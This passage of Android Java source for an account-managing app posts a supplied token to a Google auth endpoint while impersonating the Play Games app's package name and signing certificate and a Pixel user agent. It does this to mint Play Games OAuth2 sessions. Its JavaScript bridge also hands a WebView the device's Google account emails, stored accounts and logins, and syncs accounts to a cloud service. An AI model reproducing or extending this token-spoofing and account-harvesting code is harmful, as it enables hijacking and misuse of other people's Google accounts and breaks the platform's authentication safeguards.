                conn.setRequestProperty("User-Agent", "GoogleAuth/1.4 (Pixel 8; U)");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                String postData = "accountType=HOSTED_OR_GOOGLE"
                        + "&has_permission=1"
                        + "&service=" + URLEncoder.encode("oauth2:https://www.googleapis.com/auth/games", "UTF-8")
                        + "&app=com.google.android.play.games"
                        + "&client_sig=38918a453d07199354f8b19af05ec6562ced5788"
                        + "&callerPkg=com.google.android.play.games"
                        + "&Token=" + URLEncoder.encode(token, "UTF-8");

                OutputStream os = conn.getOutputStream();
                os.write(postData.getBytes("UTF-8"));
                os.close();

                int responseCode = conn.getResponseCode();
                BufferedReader br;
                if (responseCode == 200) {
                    br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
                } else {
                    br = new BufferedReader(new InputStreamReader(conn.getErrorStream(), "UTF-8"));
                }

                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) {
                    sb.append(line).append("\n");
                }
                br.close();

                String respBody = sb.toString();
                if (responseCode == 200 && respBody.contains("Auth=")) {
                    success = true;
                    resultMessage = "HTTP 200 OK: Play Games OAuth2 session acquired successfully! Token is 100% active.";
                } else {
                    success = false;
                    resultMessage = "Google Response (" + responseCode + "): " + respBody.trim();
                }
            } catch (Throwable t) {
                success = false;
                resultMessage = "Connection error: " + t.getMessage();
            }

            final boolean finalSuccess = success;
            final String finalMsg = resultMessage.replace("'", "\\'").replace("\n", " ");

            activity.runOnUiThread(new GpgsResultRunnable(webView, finalSuccess, finalMsg));
        }
    }

    // ================= JAVASCRIPT BRIDGE =================
    public static class AndroidBridge {
        private final MainActivity activity;

        public AndroidBridge(MainActivity activity) {
            this.activity = activity;
        }

        @JavascriptInterface
        public boolean isDeveloperMode() {
            return activity.isDeveloperMode();
        }

        @JavascriptInterface
        public String getAppInfo() {
            return activity.getAppInfoJson();
        }

        @JavascriptInterface
        public String getAccounts() {
            return activity.getAccountsJson();
        }

        @JavascriptInterface
        public void startGoogleLogin(final String country) {
            activity.runOnUiThread(new StartGoogleLoginRunnable(activity, country));
        }

        @JavascriptInterface
        public void closeGoogleLogin() {
            activity.runOnUiThread(new CloseGoogleLoginRunnable(activity));
        }

        @JavascriptInterface
        public void deleteAccount(final String code) {
            activity.runOnUiThread(new DeleteAccountRunnable(activity, code));
        }

        @JavascriptInterface
        public void copyToClipboard(final String text, final String label) {
            activity.runOnUiThread(new CopyClipboardRunnable(activity, text, label));
        }

        @JavascriptInterface
        public void openBrowser(final String url) {
            activity.runOnUiThread(new OpenBrowserRunnable(activity, url));
        }

        @JavascriptInterface
        public void syncCloudAccounts() {
            activity.runOnUiThread(new SyncCloudRunnable(activity));
        }

        @JavascriptInterface
        public void testGpgsToken(final String token) {
            activity.testGpgsToken(token);
        }

        @JavascriptInterface
        public void claimWeeklyPerk(final String code) {
            activity.runOnUiThread(new ClaimWeeklyPerkRunnable(activity, code));
        }

        @JavascriptInterface
        public void login(final String email, final String password) {
            activity.runOnUiThread(new LoginRunnable(activity, email, password));
        }

        @JavascriptInterface
        public void startGoogleSsoLogin() {
            activity.runOnUiThread(new StartGoogleSsoLoginRunnable(activity));
        }

        @JavascriptInterface
        public void logout() {
            activity.runOnUiThread(new LogoutRunnable(activity));
        }

        @JavascriptInterface
        public void refreshUserData() {
            activity.runOnUiThread(new RefreshUserDataRunnable(activity));
        }

        @JavascriptInterface
        public String getDeviceGoogleAccounts() {
            JSONArray arr = new JSONArray();
            try {
                List<String> list = activity.getDeviceGoogleEmails();
                for (String email : list) {
                    arr.put(email);
                }
            } catch (Throwable ignored) {}
            return arr.toString();
        }

        @JavascriptInterface
        public void launchSystemAccountChooser() {
            activity.launchSystemAccountChooser();
        }

        @JavascriptInterface
        public void setSystemBlocked(final boolean blocked) {
            activity.runOnUiThread(new SetSystemBlockedRunnable(activity, blocked));
        }
    }

    public static class SetSystemBlockedRunnable implements Runnable {
        private final MainActivity act;
        private final boolean blocked;

        public SetSystemBlockedRunnable(MainActivity a, boolean b) {
            this.act = a;
            this.blocked = b;
        }

        @Override
        public void run() {
            act.isSystemBlocked = blocked;
        }
    }

    public static class PostWebUrlRunnable implements Runnable {
        private final WebView wv;
        private final String url;
        public PostWebUrlRunnable(WebView wv, String url) {
            this.wv = wv;
            this.url = url;
        }
        @Override
        public void run() {
            if (wv != null) wv.loadUrl(url);
        }
    }

    public static class LoginCallbackImpl implements CloudSyncClient.LoginCallback {
        private final MainActivity act;
        public LoginCallbackImpl(MainActivity act) {
            this.act = act;
        }
        @Override
        public void onSuccess(String uid, String userEmail, String name, String avatar, int coins, String token) {
            if (act.accountStorage != null) {
                act.accountStorage.saveUserSession(uid, userEmail, name, avatar, coins, token);
            }
            try {
                CloudSyncClient.registerDevice(act, act.accountStorage);
            } catch (Throwable ignored) {}

            CloudSyncClient.restoreUserAccounts(uid, userEmail, new RestoreAccountsCallbackImpl(act, uid, userEmail, name, avatar, coins));
            Toast.makeText(act, "Welcome, " + name + "!", Toast.LENGTH_SHORT).show();
        }

        @Override
        public void onError(String error) {
            Toast.makeText(act, "Login Failed: " + error, Toast.LENGTH_LONG).show();
            act.notifyWebLoginError(error);
        }
    }

    public static class RestoreAccountsCallbackImpl implements CloudSyncClient.RestoreCallback {
        private final MainActivity act;
        private final String uid;
        private final String email;
        private final String name;
        private final String avatar;
        private final int coins;

        public RestoreAccountsCallbackImpl(MainActivity act, String uid, String email, String name, String avatar, int coins) {
            this.act = act;
            this.uid = uid;
            this.email = email;
            this.name = name;
            this.avatar = avatar;
            this.coins = coins;
        }

        @Override
        public void onLoaded(List<AccountItem> list) {
            if (act.accountStorage != null && list != null && !list.isEmpty()) {
                act.accountStorage.saveAccounts(list);
            }
            act.notifyWebLoginSuccess(uid, email, name, avatar, coins);
        }

        @Override
        public void onError(String msg) {
            act.notifyWebLoginSuccess(uid, email, name, avatar, coins);
        }
    }

    public static class RefreshProfileCallbackImpl implements CloudSyncClient.ProfileCallback {
        private final MainActivity act;
        public RefreshProfileCallbackImpl(MainActivity act) {
            this.act = act;
        }
        @Override
        public void onProfile(String uid, String userEmail, String name, String avatar, int coins) {
            if (act.accountStorage != null) {
                act.accountStorage.saveUserSession(uid, userEmail, name, avatar, coins, act.accountStorage.getUserAuthToken());
            }
            act.notifyWebLoginSuccess(uid, userEmail, name, avatar, coins);
        }
    }

    public static class LoginRunnable implements Runnable {
        private final MainActivity act;
        private final String email;
        private final String pass;
        public LoginRunnable(MainActivity act, String email, String pass) {
            this.act = act;
            this.email = email;
            this.pass = pass;
        }
        @Override
        public void run() {
            act.doLogin(email, pass);
        }
    }

    public static class RefreshUserDataRunnable implements Runnable {
        private final MainActivity act;
        public RefreshUserDataRunnable(MainActivity act) {
            this.act = act;
        }
        @Override
        public void run() {
            act.doRefreshUserData();
        }
    }

    public static class ClaimWeeklyPerkRunnable implements Runnable {
        private final MainActivity act;
        private final String code;

        public ClaimWeeklyPerkRunnable(MainActivity a, String c) {
            this.act = a;
            this.code = c;
        }

        @Override
        public void run() {
            act.doClaimWeeklyPerk(code);
        }
    }

    public static class LogoutRunnable implements Runnable {
        private final MainActivity act;

        public LogoutRunnable(MainActivity a) {
            this.act = a;
        }

        @Override
        public void run() {
            act.doLogout();
        }
    }

    public static class StartGoogleLoginRunnable implements Runnable {
        private final MainActivity act;
        private final String country;

        public StartGoogleLoginRunnable(MainActivity a, String c) {
            this.act = a;
            this.country = c;
        }

        @Override
        public void run() {
            act.startGoogleLogin(country);
        }
    }

    public static class StartGoogleSsoLoginRunnable implements Runnable {
        private final MainActivity act;

        public StartGoogleSsoLoginRunnable(MainActivity a) {
            this.act = a;
        }

        @Override
        public void run() {
            act.startGoogleSsoLogin();
        }
    }

    public static class CloseGoogleLoginRunnable implements Runnable {
        private final MainActivity act;

        public CloseGoogleLoginRunnable(MainActivity a) {
            this.act = a;
        }

        @Override
        public void run() {
            act.closeGoogleLogin();
        }
    }

    public static class DeleteAccountRunnable implements Runnable {
        private final MainActivity act;
        private final String code;

        public DeleteAccountRunnable(MainActivity a, String c) {
            this.act = a;
            this.code = c;
        }

        @Override
        public void run() {
            act.doDeleteAccount(code);
        }
    }

    public static class CopyClipboardRunnable implements Runnable {
        private final MainActivity act;
        private final String text;
        private final String label;

        public CopyClipboardRunnable(MainActivity a, String t, String l) {
            this.act = a;
            this.text = t;
            this.label = l;
        }

        @Override
        public void run() {
            act.copyToClipboard(text, label);
        }
    }

    public static class OpenBrowserRunnable implements Runnable {
        private final MainActivity act;
        private final String url;

        public OpenBrowserRunnable(MainActivity a, String u) {
            this.act = a;
            this.url = u;
        }

        @Override
        public void run() {
            act.openBrowserUrl(url);
        }
    }

    public static class SyncCloudRunnable implements Runnable {
        private final MainActivity act;

        public SyncCloudRunnable(MainActivity a) {
            this.act = a;
        }

        @Override
        public void run() {
            act.restoreAccountsFromCloud();
        }
    }

    public static class GpgsResultRunnable implements Runnable {
        private final WebView webView;
        private final boolean success;
        private final String msg;

        public GpgsResultRunnable(WebView wv, boolean s, String m) {
            this.webView = wv;
            this.success = s;
            this.msg = m;
        }

        @Override
        public void run() {
            if (webView != null) {
                webView.evaluateJavascript(
                        "if(window.onGpgsTestResult){ window.onGpgsTestResult(" + success + ", '" + msg + "'); }",
                        null);
            }
        }
    }

    public static class RefreshWebRunnable implements Runnable {
        private final WebView web;

        public RefreshWebRunnable(WebView w) {
            this.web = w;
        }

        @Override
        public void run() {
            if (web != null)
                web.evaluateJavascript("if(window.refreshAccounts){ window.refreshAccounts(); }", null);
        }
    }

    public static class ReloadWebRunnable implements Runnable {
        private final WebView web;

        public ReloadWebRunnable(WebView w) {
            this.web = w;
        }

        @Override
        public void run() {
            if (web != null)
                web.loadUrl("file:///android_asset/www/index.html");
        }
    }

    public static class SafeCrashHandler implements Thread.UncaughtExceptionHandler {
        private final Thread.UncaughtExceptionHandler defaultHandler;

        public SafeCrashHandler(Thread.UncaughtExceptionHandler dh) {
            this.defaultHandler = dh;
        }

        @Override
        public void uncaughtException(Thread t, Throwable e) {
            Log.e("CrashShield", "Shielded uncaught exception on thread " + t.getName(), e);
        }
    }

    public static class SafeMainWebClient extends android.webkit.WebViewClient {
        private final MainActivity activity;

        public SafeMainWebClient(MainActivity act) {
            this.activity = act;
        }

        @Override
        public boolean onRenderProcessGone(WebView view, android.webkit.RenderProcessGoneDetail detail) {
            Log.w("SafeMainWebClient", "Renderer process gone, reloading index...");
            if (view != null) {
                view.loadUrl("file:///android_asset/www/index.html");
            }
            return true;
        }
    }

    public static class LaunchAccountChooserRunnable implements Runnable {
        private final MainActivity activity;

        public LaunchAccountChooserRunnable(MainActivity act) {
            this.activity = act;
        }

        @Override
        public void run() {
            if (activity == null) return;
            try {
                Intent intent;
                if (Build.VERSION.SDK_INT >= 23) {
                    intent = AccountManager.newChooseAccountIntent(null, null, new String[]{"com.google"}, null, null, null, null);
                } else {
                    intent = AccountManager.newChooseAccountIntent(null, null, new String[]{"com.google"}, false, null, null, null, null);
                }
                activity.startActivityForResult(intent, REQUEST_CODE_PICK_ACCOUNT);
            } catch (Throwable t) {
                Log.e(TAG, "System account chooser error, falling back", t);
                List<String> emails = activity.getDeviceGoogleEmails();
                if (!emails.isEmpty()) {
                    activity.handleGoogleAccountSelectedForSso(emails.get(0));
                } else {
                    Toast.makeText(activity, "No Google account found on device.", Toast.LENGTH_SHORT).show();
                    activity.notifyWebSsoCancel();
                }
            }
        }
    }

    public static class SsoAccountSelectedRunnable implements Runnable {
        private final WebView web;
        private final String email;

        public SsoAccountSelectedRunnable(WebView w, String em) {
            this.web = w;
            this.email = em;
        }

        @Override
        public void run() {
            if (web != null && email != null) {
                String js = "javascript:(function(){ if(window.selectGoogleAccount) window.selectGoogleAccount('" + email + "'); })();";
                web.loadUrl(js);
            }
        }
    }

    public static class SsoCancelRunnable implements Runnable {
        private final WebView web;

        public SsoCancelRunnable(WebView w) {
            this.web = w;
        }

        @Override
        public void run() {
            if (web != null) {
                String js = "javascript:(function(){ if(window.setLoginBtnLoading) window.setLoginBtnLoading(false); })();";
                web.loadUrl(js);
            }
        }
    }
}
